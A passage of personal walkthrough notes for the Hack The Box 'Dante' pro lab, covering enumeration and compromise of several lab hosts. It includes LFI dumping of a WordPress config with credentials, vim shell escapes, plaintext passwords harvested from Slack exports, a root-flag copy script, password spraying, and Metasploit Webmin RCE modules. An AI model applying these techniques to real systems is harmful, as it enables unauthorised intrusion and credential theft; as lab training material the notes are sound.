path: C:\samba
password:
netname: IPC$
remark: IPC Service (DANTE-NIX02 server (Samba, Ubuntu))
path: C:\tmp
password:
```

Network share information for SlackMigration:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.21.png]]
Network share information for IPC$:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.22.png]]
Network share information for Print$:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.23.png]]
Domain Enumeration:
```
rpcclient $> enumdomains
name:[DANTE-NIX02] idx:[0x0]
name:[Builtin] idx:[0x1]
rpcclient $>
```

SID enumeration:
```
rpcclient $> lsaenumsid
found 6 SIDs
S-1-5-32-550
S-1-5-32-548
S-1-5-32-551
S-1-5-32-549
S-1-5-32-544
S-1-1-0
rpcclient $> lookupsids S-1-5-32-550
S-1-5-32-550 BUILTIN\Print Operators (4)
rpcclient $> lookupsids S-1-5-32-548
S-1-5-32-548 BUILTIN\Account Operators (4)
rpcclient $> lookupsids S-1-5-32-551
S-1-5-32-551 BUILTIN\Backup Operators (4)
rpcclient $> lookupsids S-1-5-32-549
S-1-5-32-549 BUILTIN\Server Operators (4)
rpcclient $> lookupsids S-1-5-32-544
S-1-5-32-544 BUILTIN\Administrators (4)
rpcclient $> lookupsids S-1-1-0
S-1-1-0 \Everyone (5)
rpcclient $>
```

I was finally able to use SMBclient to access the SlackMigration file share by ommitting the "-L" parameter which had caused errors. Then I found a .txt file containing hints similarly to the "todo.txt" file from the beginning of the exercise!:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.24.png]]

When using the LFI wordlist I obtained earlier (found here: <https://github.com/Karmaz95/crimson/blob/master/words/exp/LFI>) , I found that the following directories responded with meaningful information. The needed credentials to gain a foothold has to be in here. I will need to decode the response in Base64 for each one of these requests:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.25.png]]

Request number 392 yielded results in base64 and when decoding it I received the following output.:
```
<?php
/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the
* installation. You don't have to use the web site, you can
* copy this file to "wp-config.php" and fill in the values.
*
* This file contains the following configurations:
*
* * MySQL settings
* * Secret keys
* * Database table prefix
* * ABSPATH
*
* @link https://wordpress.org/support/article/editing-wp-config-php/
*
* @package WordPress
*/
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'margaret' );
/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
* Authentication Unique Keys and Salts.
*
* Change these to different unique phrases!
* You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
*
* @since 2.6.0
*/
define( 'AUTH_KEY',        'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',  'put your unique phrase here' );
define( 'NONCE_SALT',      'put your unique phrase here' );
/**#@-*/
/**
* WordPress Database Table prefix.
*
* You can have multiple installations in one database if you give each
* a unique prefix. Only numbers, letters, and underscores please!
*/
$table_prefix = 'wp_';
/**
* For developers: WordPress debugging mode.
*
* Change this to true to enable the display of notices during development.
* It is strongly recommended that plugin and theme developers use WP_DEBUG
* in their development environments.
*
* For information on other constants that can be used for debugging,
* visit the documentation.
*
* @link https://wordpress.org/support/article/debugging-in-wordpress/
*/
define( 'WP_DEBUG', false );
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
define( 'ABSPATH', __DIR__ . '/' );
}
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

I was able to login via SSH to the machine with username margaret and her password from the above file. Next, I was then able to escalate to a normal bash shell by using the following command using vim.:
```
:!/bin/sh
```
If the above stop working for some reason, try:

```
# Press ESC key
:set shell=/bin/sh
:shell
```
I need to find a way to escalate privileges to either frank or root. Most likely, frank will be the target here. However, I feel like I'm missing frank's credential in a file somewhere so I need to look once again in the files.

I found the following information from Frank's directory.:
```
]margaret@DANTE-NIX02:/home/frank/Downloads/Test Workspace Slack export May 17 2020 - May 18 2020$ cat users.json
[
    {
        "id": "U013CT40QHM",
        "team_id": "T013LTDB554",
        "name": "htb_donotuse",
        "deleted": false,
        "color": "9f69e7",
        "real_name": "Frank",
        "tz": "America\/Los_Angeles",
        "tz_label": "Pacific Daylight Time",
        "tz_offset": -25200,
        "profile": {
            "title": "",
            "phone": "",
            "skype": "",
            "real_name": "Frank",
            "real_name_normalized": "Frank",
            "display_name": "",
            "display_name_normalized": "",
            "fields": null,
            "status_text": "",
            "status_emoji": "",
            "status_expiration": 0,
            "avatar_hash": "ga341d23f843",
            "email": "HTB_DONOTUSE@protonmail.com",
            "image_24": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=24&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-24.png",
            "image_32": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=32&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-32.png",
            "image_48": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=48&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-48.png",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-72.png",
            "image_192": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=192&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-192.png",
            "image_512": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=512&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-512.png",
            "status_text_canonical": "",
            "team": "T013LTDB554"
        },
        "is_admin": true,
        "is_owner": true,
        "is_primary_owner": true,
        "is_restricted": false,
        "is_ultra_restricted": false,
        "is_bot": false,
        "is_app_user": false,
        "updated": 1589810238
    },
    {
        "id": "U014025GL3W",
        "team_id": "T013LTDB554",
        "name": "thisissecretright",
        "deleted": false,
        "color": "4bbe2e",
        "real_name": "Margaret",
        "tz": "Europe\/London",
        "tz_label": "British Summer Time",
        "tz_offset": 3600,
        "profile": {
            "title": "",
            "phone": "",
            "skype": "",
            "real_name": "Margaret",
            "real_name_normalized": "Margaret",
            "display_name": "Margaret",
            "display_name_normalized": "Margaret",
            "fields": null,
            "status_text": "",
            "status_emoji": "",
            "status_expiration": 0,
            "avatar_hash": "g368549a1713",
            "email": "thisissecretright@protonmail.com",
            "image_24": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=24&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-24.png",
            "image_32": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=32&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-32.png",
            "image_48": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=48&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-48.png",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-72.png",
            "image_192": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=192&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-192.png",
            "image_512": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=512&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-512.png",
            "status_text_canonical": "",
            "team": "T013LTDB554"
        },
        "is_admin": false,
        "is_owner": false,
        "is_primary_owner": false,
        "is_restricted": false,
        "is_ultra_restricted": false,
        "is_bot": false,
        "is_app_user": false,
        "updated": 1589793792
```

There was a zip file as well in this directory with some files that are protected so I transferred them to my local machine via netcat. After extracting the folder, I was able to read all files. Here's what I found so far.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.26.png]]

```
STARS5678FORTUNE401 - Password for "Ubuntu images"
```

![[./_resources/HTB_Pro_Lab_Dante.resources/image.27.png]]

Frank's new password on the Ubuntu box:
```
69F15HST1CX
```

However, the password above for the "ubuntu box" is actually placeholders that were added onto the conversation by Frank when he downloaded and modified the conversation. In this case, I went and explored files in Margaret's directory. If Frank has a copy of the conversation, Margaret must have a copy as well. Sure enough, I found it under the .config/Slack/exported\_data/secure directory under Margaret which displayed the passwords in plaintext!:
```
"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"
```

Full downloaded conversation can be found here:
![[./_resources/HTB_Pro_Lab_Dante.resources/2020-05-18.json]]

Root Flag:

I was able to get the root flag by making a simple python script that uses the os module to execute a command to cp the 'flag.txt' file in the root directory to the tmp directory for me to view. It worked!!

Python code:
```
#!/usr/bin/env python
import os
os.system('cp /root/flag.txt /tmp')
```

![[./_resources/HTB_Pro_Lab_Dante.resources/image.28.png]]

Host [172.16.1.5](http://172.16.1.5):

```
Not shown: 993 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          FileZilla ftpd
111/tcp  open  rpcbind      2-4 (RPC #100000)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s    Microsoft SQL Server 2019 15.00.2000
2049/tcp open  mountd      1-3 (RPC #100005)

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.63 seconds
zsh: segmentation fault  proxychains nmap -sT -sV 172.16.1.5
```

![[./_resources/HTB_Pro_Lab_Dante.resources/image.38.png]]

After running Nmap vulns scripts, this machine is vulnerable to the following CVE: <https://nvd.nist.gov/vuln/detail/CVE-2012-1182#vulnCurrentDescriptionTitle>

Enumerating the host further for SQL info:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.29.png]]

After using msfconsole by utilizing the resource file I had made for password spraying, I noticed shortly after that one credential actually allowed a successful login to occur on the host on FTP 21. I was able to then use the credentials (listed below) to access FTP and find the first flag on this machine with a hint.:

```
172.16.1.5:21        - 172.16.1.5:21 - Login Successful: anonymous:IEUser@
```

I found the first flag after logging into the machine via FTP and listing out the files. I saw flag.txt and used the "get" command to download that file.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.37.png]]

For the root flag, I need to figure out how to use xp\_cmdshell per Pillage from Discord. This should let me get access to the SQL server and acquire the root credentials I need to complete this one.

Host [172.16.1.12](http://172.16.1.12):
```
Nmap scan report for 172.16.1.12
Host is up (0.052s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
3306/tcp open  mysql?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.92%I=7%D=9/18%Time=6327AADE%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:172\.1
SF:6\.1\.12\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.92%I=7%D=9/18%Time=6327AAD3%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLine
SF:s,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest,4
SF:B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions,4B,
SF:"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,4B,"G
SF:\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4B,"G\0\0\
SF:x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqTCP,4B,
SF:"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusRequestT
SF:CP,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4B,"G\
SF:0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,4B,"G\
SF:0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerCookie
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionReq
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,4B,"
SF:G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,4B,"G\0
SF:\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4B,"G\0\0\x0
SF:1\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x20co
SF:nnect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.02 seconds
zsh: segmentation fault  proxychains nmap -sV 172.16.1.12
```

After conducting a directory bruteforce, I found a list of team members.:
![[./_resources/HTB_Pro_Lab_Dante.resources/ferox172.txt]]

![[./_resources/HTB_Pro_Lab_Dante.resources/image.30.png]]

**Host [172.16.1.13](http://172.16.1.13):**

![[./_resources/HTB_Pro_Lab_Dante.resources/image.35.png]]![[./_resources/HTB_Pro_Lab_Dante.resources/image.36.png]]

Feroxbuster directory results:
```
302      GET        0l        0w        0c http://172.16.1.13/ => http://172.16.1.13/dashboard/
403      GET      42l      97w        0c http://172.16.1.13/webalizer
301      GET        9l      30w      332c http://172.16.1.13/img => http://172.16.1.13/img/
403      GET      45l      113w        0c http://172.16.1.13/phpmyadmin
MSG      0.000 feroxbuster::heuristics detected directory listing: http://172.16.1.13/img (Apache)
200      GET        5l        9w      337c http://172.16.1.13/img/module_table_top.png
301      GET        9l      30w      338c http://172.16.1.13/dashboard => http://172.16.1.13/dashboard/
200      GET        3l      16w      751c http://172.16.1.13/img/module_table_bottom.png
301      GET        9l      30w      341c http://172.16.1.13/dashboard/fr => http://172.16.1.13/dashboard/fr/
301      GET        9l      30w      341c http://172.16.1.13/dashboard/ru => http://172.16.1.13/dashboard/ru/
301      GET        9l      30w      341c http://172.16.1.13/dashboard/it => http://172.16.1.13/dashboard/it/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://172.16.1.13/dashboard/Images (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://172.16.1.13/dashboard/images (Apache)
301      GET        9l      30w      345c http://172.16.1.13/dashboard/Images => http://172.16.1.13/dashboard/Images/
200      GET      13l      93w    3361c http://172.16.1.13/dashboard/images/social-icons.png
301      GET        9l      30w      341c http://172.16.1.13/dashboard/es => http://172.16.1.13/dashboard/es/
301      GET        9l      30w      350c http://172.16.1.13/dashboard/javascripts => http://172.16.1.13/dashboard/javascripts/
301      GET        9l      30w      341c http://172.16.1.13/dashboard/pl => http://172.16.1.13/dashboard/pl/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://172.16.1.13/dashboard/javascripts (Apache)
200      GET    5523l    16178w  188385c http://172.16.1.13/dashboard/javascripts/all.js
MSG      0.000 feroxbuster::heuristics detected directory listing: http://172.16.1.13/dashboard/stylesheets (Apache)
301      GET        9l      30w      336c http://172.16.1.13/discuss => http://172.16.1.13/discuss/
200      GET    9147l    36448w  481698c http://172.16.1.13/dashboard/stylesheets/all.css
200      GET    1407l    5561w    51365c http://172.16.1.13/dashboard/javascripts/modernizr.js
301      GET        9l      30w      350c http://172.16.1.13/dashboard/stylesheets => http://172.16.1.13/dashboard/stylesheets/
301      GET        9l      30w      341c http://172.16.1.13/dashboard/ro => http://172.16.1.13/dashboard/ro/
200      GET        8l      76w    2678c http://172.16.1.13/dashboard/images/fastly-logo@2x.png
200      GET    9147l    36448w  481810c http://172.16.1.13/dashboard/stylesheets/all-rtl.css
301      GET        9l      30w      332c http://172.16.1.13/IMG => http://172.16.1.13/IMG/
301      GET        9l      30w      343c http://172.16.1.13/dashboard/docs => http://172.16.1.13/dashboard/docs/
301      GET        9l      30w      341c http://172.16.1.13/dashboard/de => http://172.16.1.13/dashboard/de/
200      GET        0l        0w    17195c http://172.16.1.13/dashboard/Images/stack-icons.png
301      GET        9l      30w      341c http://172.16.1.13/dashboard/tr => http://172.16.1.13/dashboard/tr/
301      GET        9l      30w      341c http://172.16.1.13/dashboard/hu => http://172.16.1.13/dashboard/hu/
```
Additional directory results from /admin; Also check ferox4 file:
```
http://172.16.1.13/discuss/ 
[##>-----------------] - 16m    2971/20116  3/s    http://172.16.1.13/discuss/admin 
[##>-----------------] - 12m    2799/20116  3/s    http://172.16.1.13/discuss/Admin 
[####################] - 2s    20116/20116  0/s    http://172.16.1.13/discuss/db => Directory listing
[##>-----------------] - 16m    2390/20116  2/s    http://172.16.1.13/discuss/ADMIN 
[#>------------------] - 14m    1652/20116  1/s    http://172.16.1.13/discuss/DB 
[>-------------------] - 12m      478/20116  0/s    http://172.16.1.13/discuss/ups 
[>-------------------] - 5m        29/20116  0/s    http://172.16.1.13/discuss/Admin/ups
```

I found a cookie ID when curling out the <http://172.16.1.13/discuss/admin> webpage:
```
> GET /discuss/ADMIN/ HTTP/1.1
> Host: 172.16.1.13
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Mon, 19 Sep 2022 00:00:47 GMT
< Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
< X-Powered-By: PHP/7.4.7
< Set-Cookie: PHPSESSID=pfhj94lqlplo5qlvv840t6n1eq; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< location: ./login.php
< Content-Length: 3832
< Content-Type: text/html; charset=UTF-8
```
I found a file containing JPEGS and what seems to be usernames when analyzing it with Ghidra.:
![[./_resources/HTB_Pro_Lab_Dante.resources/Thumbs.db]]

Host [172.16.1.17](http://172.16.1.17):

![[./_resources/HTB_Pro_Lab_Dante.resources/image.31.png]]

In checking the above, a vulnerable Webmin server is being run on this linux machine. Per the below screenshot from 'monitor' document I downloaded from the available 'forensics' SMB share, the specific vulnerability is an RCE for change\_password.cgi file/function.  The followig MSF module can exploit this vuilnerability:
```
msf6 exploit(linux/http/webmin_backdoor)
```
site provides additional information: <https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html> and the following link was provided from the 'monitor' file: <http://www.webmin.com/security.html>
![[./_resources/HTB_Pro_Lab_Dante.resources/image.41.png]]
I found that the 'monitor' file was a pcap that opened with Wireshark automatically. I remembered the 'FINtastic' flag in the lab page and went ahead and followed the TCP stream which then allowed me to get credentials!:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.42.png]]![[./_resources/HTB_Pro_Lab_Dante.resources/image.43.png]]

I was able to login to the s<https://172.16.1.17:10000/session_login.cgi> using:
```
Uname: admin
passwd: Password6543
```

After accessing the site, I used the terminal option and I "ls" immediately which revealed the flag.txt.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.44.png]]

I can confirm that the vulnerability here is the following msfconsole exploit that takes advantage of the credentials for webmin and the activation of the upload and download modules which I've all confirmed. However, my issue is that the exploit timesout for some reason.:
```
linux/http/webmin_packageup_rce
```

![[./_resources/HTB_Pro_Lab_Dante.resources/image.45.png]]

It seems, after checking in Discord, this is in fact the only flag on this machine which I guess makes sense since I got the root flag first.

Host [172.16.1.19](http://172.16.1.19):

This one requires a dependency from another machine I may not have rooted yet.
![[./_resources/HTB_Pro_Lab_Dante.resources/image.32.png]]

Host [172.16.1.20](http://172.16.1.20):

```
Nmap scan report for 172.16.1.20
Host is up (0.054s latency).
Not shown: 978 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|  3072 1519e666c34ff7807e48f7b99af9ee08 (RSA)
|  256 f3ea12b5fab00c14fb65980f09925c56 (ECDSA)
|_  256 42ca16675ae7a201b0634bf7ed55db90 (ED25519)
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 8.5
| http-title: 
|  title: \x0D
|_\x0D
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: Microsoft-IIS/8.5
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-10-16 00:39:04Z)
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
443/tcp  open  ssl/http          Microsoft IIS httpd 8.5
| http-title: 
|  title: \x0D
|_\x0D
| http-robots.txt: 1 disallowed entry 
|_/ 
|_ssl-date: 2022-10-16T00:40:56+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN::S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
|_http-server-header: Microsoft-IIS/8.5
445/tcp  open  microsoft-ds      Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: DANTE)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=DANTE-DC01.DANTE.local
| Not valid before: 2022-07-18T16:25:33
|_Not valid after:  2023-01-17T16:25:33
| rdp-ntlm-info: 
|  Target_Name: DANTE
|  NetBIOS_Domain_Name: DANTE
|  NetBIOS_Computer_Name: DANTE-DC01
|  DNS_Domain_Name: DANTE.local
|  DNS_Computer_Name: DANTE-DC01.DANTE.local
|  DNS_Tree_Name: DANTE.local
|  Product_Version: 6.3.9600
|_  System_Time: 2022-10-16T00:40:37+00:00
|_ssl-date: 2022-10-16T00:40:56+00:00; +1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DANTE-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-os-discovery: 
|  OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|  OS CPE: cpe:/o:microsoft:windows_server_2012::-
|  Computer name: DANTE-DC01
|  NetBIOS computer name: DANTE-DC01\x00
|  Domain name: DANTE.local
|  Forest name: DANTE.local
|  FQDN: DANTE-DC01.DANTE.local
|_  System time: 2022-10-16T01:40:43+01:00
| smb2-security-mode: 
|  302: 
|_    Message signing enabled and required
|_clock-skew: mean: -9m56s, deviation: 24m23s, median: 0s
| smb2-time: 
|  date: 2022-10-16T00:40:41
|_  start_date: 2022-10-15T07:06:15
| smb-security-mode: 
|  account_used: guest
|  authentication_level: user
|  challenge_response: supported
|_  message_signing: required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.81 seconds
```

So far, I've only been able to login with a null session with rpcclient but have not yet been able to find anything useful.:
```
proxychains rpcclient -U "" -N 172.16.1.20
```

Nmap AD LDAP Enum Scan:
```
Host is up (0.083s latency).
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|  <ROOT>
|      currentTime: 20221115223320.0Z
|      subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=DANTE,DC=local
|      dsServiceName: CN=NTDS Settings,CN=DANTE-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=DANTE,DC=local
|      namingContexts: DC=DANTE,DC=local
|      namingContexts: CN=Configuration,DC=DANTE,DC=local
|      namingContexts: CN=Schema,CN=Configuration,DC=DANTE,DC=local
|      namingContexts: DC=DomainDnsZones,DC=DANTE,DC=local
|      namingContexts: DC=ForestDnsZones,DC=DANTE,DC=local
|      defaultNamingContext: DC=DANTE,DC=local
|      schemaNamingContext: CN=Schema,CN=Configuration,DC=DANTE,DC=local
|      configurationNamingContext: CN=Configuration,DC=DANTE,DC=local
|      rootDomainNamingContext: DC=DANTE,DC=local
|      supportedControl: 1.2.840.113556.1.4.319
|      supportedControl: 1.2.840.113556.1.4.801
|      supportedControl: 1.2.840.113556.1.4.473
|      supportedControl: 1.2.840.113556.1.4.528
|      supportedControl: 1.2.840.113556.1.4.417
|      supportedControl: 1.2.840.113556.1.4.619
|      supportedControl: 1.2.840.113556.1.4.841
|      supportedControl: 1.2.840.113556.1.4.529
|      supportedControl: 1.2.840.113556.1.4.805
|      supportedControl: 1.2.840.113556.1.4.521
|      supportedControl: 1.2.840.113556.1.4.970
|      supportedControl: 1.2.840.113556.1.4.1338
|      supportedControl: 1.2.840.113556.1.4.474
|      supportedControl: 1.2.840.113556.1.4.1339
|      supportedControl: 1.2.840.113556.1.4.1340
|      supportedControl: 1.2.840.113556.1.4.1413
|      supportedControl: 2.16.840.1.113730.3.4.9
|      supportedControl: 2.16.840.1.113730.3.4.10
|      supportedControl: 1.2.840.113556.1.4.1504
|      supportedControl: 1.2.840.113556.1.4.1852
|      supportedControl: 1.2.840.113556.1.4.802
|      supportedControl: 1.2.840.113556.1.4.1907
|      supportedControl: 1.2.840.113556.1.4.1948
|      supportedControl: 1.2.840.113556.1.4.1974
|      supportedControl: 1.2.840.113556.1.4.1341
|      supportedControl: 1.2.840.113556.1.4.2026
|      supportedControl: 1.2.840.113556.1.4.2064
|      supportedControl: 1.2.840.113556.1.4.2065
|      supportedControl: 1.2.840.113556.1.4.2066
